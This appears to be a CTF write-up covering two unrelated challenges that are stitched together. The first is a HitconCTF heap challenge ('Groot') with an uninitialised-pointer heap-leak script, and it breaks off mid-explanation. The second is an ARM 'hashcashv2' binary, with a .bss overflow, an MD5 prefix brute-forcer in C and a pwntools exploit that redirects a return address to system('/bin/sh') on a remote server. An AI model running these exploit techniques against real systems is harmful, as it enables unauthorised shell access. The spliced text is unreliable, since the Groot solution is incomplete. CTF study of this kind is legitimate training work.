# Groot

![Game](images/groot.png)

Very interesting and tricky challenge from HitconCTF that i played for almost 2 entire days. Not an expert of heap exploitation, but managed to solve it :D 

Groot is a c++ executable compiled with the following security options:
* Arch:     amd64-64-little
* RELRO:    Full RELRO
* Stack:    Canary found
* NX:       NX enabled
* PIE:      PIE enabled
* FORTIFY:  Enabled

It emulates a UNIX-like bash with some commands available, and a set of files and directory created at start-up. 
The filesystem is very simple. Files, directories and symbolic links have all the same structure.

```C
struct filesystem_object
{
    int type;                               // 1 = normal file, 2 = directory, 4 = symbolic link
    int unused;
    filesystem_object *parent_directory;    // Points to the parent directory
    filesystem_object *head;                // Head of a list of filesystem_object
    filesystem_object *next;                // Next filesystem_object in the current directory
    filesystem_object *file_name;           // Name of the file
    filesystem_object *file_content;        // Content of the file
}
```

As you can imagine, files don't have `head` because they are not directory and obviously directories don't have `file_content` because they are not files. For instance a directory with 3 files will have the following structure.

![Filesystem](images/filesystem.png)

The available commands are `ls`, `cat`, `cd`, `rm`, `mv`, `mkdir`, `mkfile`, `touch`, `pwd`, `ln` and `id`. They work pretty much like the UNIX commands except some limitations given by the context. Functions used for these command are almost clean: `mv` has a bug that allows to rename a file with a already existing file name in the current directory just prefixing the new name of the file with `/`(e.g. `mv name /new_name` will rename the file name to new_name in the current directory even if new_name already exists), and a 3 byte overflow in `mkfile` which i think is not usable in my opinion.
Instead, the real vulnerabilities of this challenge is in the creation of a directory. Whenever a directory is created, the pointer to the `head` is not set to 0. This allows to create a new directory with a `head` pointer that could be controlled in some way.

## Heap leak

If a directory is freed, all of the files, directories, names and contents are freed even before the parent directory gets freed. If then a new directory is created it will contains the same `head` address of the previus and freed directory. Thus, my idea was exactly this one: free a directory with a file inside, reallocate it immediately and then list the files to leak an address of a freed chunk. Moreover, one file wasn't not enought cause one freed chunks just contains a null pointer to the next free chunk. Two file weren't not enought too, cause every argument of a command is allocated as a chunk(so just typing the command will consume chunks in the freed linked list).
The part of the exploit that performs the leak is the following:

```python
makeDir     (conn, 'directory1')
cdDir       (conn, 'directory1')
createFile  (conn, 'file1', 'AAAA')
createFile  (conn, 'file2', 'BBBB')
createFile  (conn, 'file3', 'CCCC')
cdDir       (conn, '..')
rmFile      (conn, 'directory1')
makeDir     (conn, 'directory1')
leak = ls   (conn, 'directory1')
leak = leak.split('\x1b\x5b\x30\x6d\x09')[2]
leak = leak.ljust(8, '\x00')
heap_base = u64(leak) - 0x12d20
print 'Heap base: ' + hex(heap_base)
cdDir       (conn, 'A' * 0x30)
cdDir       (conn, 'A' * 0x30)
cdDir       (conn, 'A' * 0x30)
cdDir       (conn, 'AAAA')
cdDir       (conn, 'AAAA')
cdDir       (conn, 'AAAA')
cdDir       (conn, 'AAAA')
cdDir       (conn, '..')
```

commands after the `print` clear the workspace(i.e, fill some freed chunks) and then i preferred leave the directory for avoiding segfaults.









As you can see in the image above, you are required to find a string, that starts with `nonce`, which it's MD5 hash that starts with `n` zero bytes, where `n` is the level number. At the very end (level 16) you are required to find an MD5 hash with all bytes to zero. If you find such hash, the program will do for you `system('/bin/sh')`.

You are provided with:
* `lib` directory: for libraries
* `chall` bash file: for starting up the program
* `hashcashv2` executable

Info about hashcashv2:
* Arch:     arm-32-little
* RELRO:    Full RELRO
* Stack:    Canary found
* NX:       NX enabled
* PIE:      No PIE (0x10000)

I'm not an expert on crypto but for sure, there's no way to win the game legitly. Thus, i started looking for any vulnerability in the input and i find out that the input has an huge overflow in the `stdin`, `stdout` section. The memory structure of `.data` and `.bss` is the following.

![Memory](images/memory.png)

We can overwrite until `hmask`, so changing `count`, `nonce`, `stderr`, `stdin`, `stdout` and of course `hmash`. Changing `stdin` or `stdout` will lead to a segfault when performing input/ouptut operation (print, read, ...), so one of the first things i looked for was a memory leak of the libc. Unfortunately, i didn't find anything and i thought a way to change them without trigger any input/output operation.
The remaining variables in the `.bss` are:
* `count`: an signed integer variable used for addressing all of the hashes in a buffer on the stack. It is incremented every level and multiplied for 16(length of a MD5 digest) to select the address in which will be stored the current level hash.
* `nonce`: it's the random byte which starts our string that will be hashed. It's a random value and it's not changing each level. It is placed in the input buffer on `.data` before reading the input.
* `hmask`: mask used for show how many bytes are set to zero in the current level. Not very useful.
Basically, we can change `count` and `nonce`. Incrementing the value of `count` will lead to an overwriting on part of the stack we are not interesed in. The game won't return normally, there's an alarm and so the only way to reach the return address on the stack is win the game legitly. Given that the `count` variable is signed, we can decrement it! In fact, if we overwrite the `count` variable with -1(`\xff\xff\xff\xff`), we can place the hash of the current input in the frame of a function called in the main function. The first function that will be called is the function that generates the hash and place it(using the `count` variable) in the buffer of the hash. With `count` equal to -1 this function overwrite its return address with the lowest 4 bytes of the current hash.

## Idea! 

Overwrite the return address of the hash function with a choosen address, so finding a collision on the first 4 byte of the hash.
The only address we can use is 0x00010C70 which performs: <br />
LDR     R0, =aBinSh     ; "/bin/sh" <br />
BL      system <br />
<br />
N.B.: This address won't lead to any input/output operation, so it's perfect.

## String structure

Finally, we just need to create a string which its MD5 hash has its 4 byte equal to 0x00010C70.
The string is composed by:
* 1 random byte(`nonce`): we can not choose nor change it.
* 1023 bytes: i placed them to `\x00`.
* 20 bytes: bytes for `stderr`, `stdin`, `stdout` and 4 unused bytes.
* `count` bytes: they have to be placed to `\xff\xff\xff\xff`
* 4 bytes called `a`, `b`, `c` and `d`: i placed these bytes at the end in order to iterate them to find a collision.

## Problem

The only part of this string we cannot control is the `nonce` byte, so i decided to fill a list of `a`, `b`, `c` and `d` values that bring to a collision, for each value of `nonce`.

## Script and collision generator

I used the following program to generate the collision.

```C
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <openssl/md5.h>


void printHash(char *digest)
{
    int i;

    printf("MD5: ");
    for(i = 0; i < 16; i++)
    {
        if (digest[i])
        {
            printf("%02x", digest[i] & 0xff);
        }
        else
        {
            printf("00");
        }
    }
    printf("\n");
}

void main(int argc, char const *argv[])
{
    unsigned char digest[16];
    MD5_CTX initial;
    MD5_CTX final;
    unsigned char data[1048];
    unsigned char end[4];
    int i, a, b, c , d;
    bool found;


    for(i = 1; i < 256; i++)
    {
        memset(data, 0, 1048);
        data[0] = i;
        data[1044] = 0xff;
        data[1045] = 0xff;
        data[1046] = 0xff;
        data[1047] = 0xff;
        MD5_Init(&initial);
        MD5_Update(&initial, data, 1048);
        found = false;
        for(a = 0; a < 256 && found == false; a++)
        {
            for(b = 0; b < 256 && found == false; b++)
            {
                for(c = 0; c < 256 && found == false; c++)
                {
                    for(d = 0; d < 256 && found == false; d++)
                    {
                        memcpy(&final, &initial, sizeof(MD5_CTX));
                        end[0] = (char) a;
                        end[1] = (char) b;
                        end[2] = (char) c;
                        end[3] = (char) d;
                        MD5_Update(&final, end, 4);
                        MD5_Final(digest, &final);
                        if((char) digest[0] == 0x70)
                        {
                            if((char) digest[1] == (char) 0x0C)
                            {
                                if((char) digest[2] == (char) 0x01)
                                {
                                    if((char) digest[3] == (char) 0x00)
                                    {
                                        printf("i: %02x\n", i & 0xff);
                                        printf("a: %02x\n", a & 0xff);
                                        printf("b: %02x\n", b & 0xff);
                                        printf("c: %02x\n", c & 0xff);
                                        printf("d: %02x\n", d & 0xff);
                                        found = true;
                                        printHash(digest);
                                    }
                                }
                            }                           
                        }
                    }
                }
            }
        }
    }
}
```

It's very ignorant but, as i said, i'm not good on crypto stuff. However, it generates a collision at most every 3 min.
Once generated a new collision, the `a`, `b`, `c` and `d` are placed in a list of the following script.

```Python
from pwn import *
import md5

abcd_array = ['\x81\xf3\x1f\x02', '\x6a\xbc\xc3\x37']
while True:
    try:
        #conn = process(argv=['qemu-arm', '-g', '4000', '-L', './', './hashcashv2_patched'])
        conn = remote('142.93.39.178 2023', 2023)
        conn.recvuntil('\x1B[1mnonce:\x1B[0m 0x')
        byte = conn.recvuntil('\n')
        byte = int(byte, 16)
        conn.recvuntil('\x1B[1minput:\x1B[0m ')
        data_payload = ('\x00' * 1023)
        #libc std
        bss_payload = '\x00' * 16
        #completed
        bss_payload += '\x00' * 4
        #count
        bss_payload += '\xff\xff\xff\xff'
        #"proof of work"
        bss_payload += abcd_array[byte]
        payload = data_payload + bss_payload
        conn.sendline(payload)
        conn.interactive()
    except Exception as e:
        conn.close()
        continue
```
As you can see, there are only two values in the list because i got lucky and the `nonce` byte was 0x00 or 0x01.
<br />
`SECT{Y0U_kn0w_i7s_b@d_wHeN_cAn4R1es_n33d_C@NaRi3z}`